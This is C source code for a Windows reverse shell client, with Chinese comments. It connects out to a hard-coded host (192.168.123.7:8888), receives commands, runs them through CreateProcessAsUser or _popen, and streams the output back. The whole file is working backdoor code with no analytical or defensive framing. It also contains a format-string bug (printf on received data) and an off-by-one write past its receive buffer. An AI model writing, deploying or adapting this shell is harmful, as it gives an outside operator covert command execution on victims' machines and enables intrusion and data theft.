#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <userenv.h>

void sendChunkedData(SOCKET s, const char *data, int length);
void executeCommandAsUser(SOCKET s, HANDLE hToken, const char *command);
void Popen(SOCKET s, const char *command);
void WSRCCmd(SOCKET s, const char *command);

int main()
{
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET)
    {
        fprintf(stderr, "创建套接字时出错\n");
        return 1;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr("192.168.123.7");
    serverAddr.sin_port = htons(8888);

    if (connect(clientSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        fprintf(stderr, "连接服务器时出错\n");
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }
    else
    {
        send(clientSocket,"end",4,0);

    }

    //获取用户的令牌并将其存储在hToken中
    HANDLE hToken;

    char buffer[1024000];
    int bytesReceived;
    char *CmdDecetion;
    while (1)
    {
        bytesReceived = recv(clientSocket, buffer, 1024000, 0);
        if (bytesReceived > 0)
        {
            buffer[bytesReceived] = '\0';
            char *CmdDecetion = strdup(buffer); // 复制buffer
            char *token = strtok(CmdDecetion, " ");
            if (token != NULL)
            {
                if (strcmp(token, "wsrc") == 0)
                {
                    WSRCCmd(clientSocket, token);
                }
                else
                {
                    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
                    {
                        printf(buffer);
                        executeCommandAsUser(clientSocket, hToken, buffer); // 传递复制后的字符串
                        CloseHandle(hToken);
                    }
                    else
                    {
                        DWORD error = GetLastError();
                        printf("OpenProcessToken failed with error %d\n", error);
                    }
                }
            }
            free(CmdDecetion); // 释放复制的字符串内存
        }
        else if (bytesReceived == 0)
        {
            printf("服务器断开连接\n");
            break;
        }
        else
        {
            fprintf(stderr, "接收数据时出错\n");
            break;
        }
    }

    closesocket(clientSocket);
    WSACleanup();
    return 0;
}

void executeCommandAsUser(SOCKET s, HANDLE hToken, const char *command)
{
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES saAttr;
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    DWORD bytesRead;
    char buffer[102400];

    ZeroMemory(&saAttr, sizeof(SECURITY_ATTRIBUTES));
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0))
    {
        fprintf(stderr, "创建管道时出错\n");
        Popen(s, command);
        return;
    }

    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.hStdError = hWritePipe;
    si.hStdOutput = hWritePipe;
    si.dwFlags |= STARTF_USESTDHANDLES;

    if (!CreateProcessAsUser(hToken, NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
    {
        fprintf(stderr, "以用户身份创建进程时出错\n");
        Popen(s, command);
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return;
    }

    CloseHandle(hWritePipe);

    while (ReadFile(hReadPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0)
    {
        sendChunkedData(s, buffer, bytesRead);
    }
    send(s,"end",4,0);

    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
void sendChunkedData(SOCKET s, const char *data, int length)
{
    int totalSent = 0;
    while (totalSent < length)
    {
        int bytesSent = send(s, data + totalSent, length - totalSent, 0);
        if (bytesSent == SOCKET_ERROR)
        {
            fprintf(stderr, "Error sending data\n");
            return;
        }
        totalSent += bytesSent;
    }
}
void Popen(SOCKET s, const char *command)
{
    FILE *fp;
    char buffer[102400];

    if ((fp = _popen(command, "r")) == NULL)
    {
        fprintf(stderr, "执行命令时出错\n");
        return;
    }

    while (fgets(buffer, sizeof(buffer), fp) != NULL)
    {
        sendChunkedData(s, buffer, strlen(buffer));
    }
    send(s,"end",4,0);
    _pclose(fp);
}
void WSRCCmd(SOCKET s, const char *command)
{
    command = strtok(NULL, " ");
    if (command != NULL)
    {
    }
    else
    {
        sendChunkedData(s, "commmand not found error", 25);
    }
}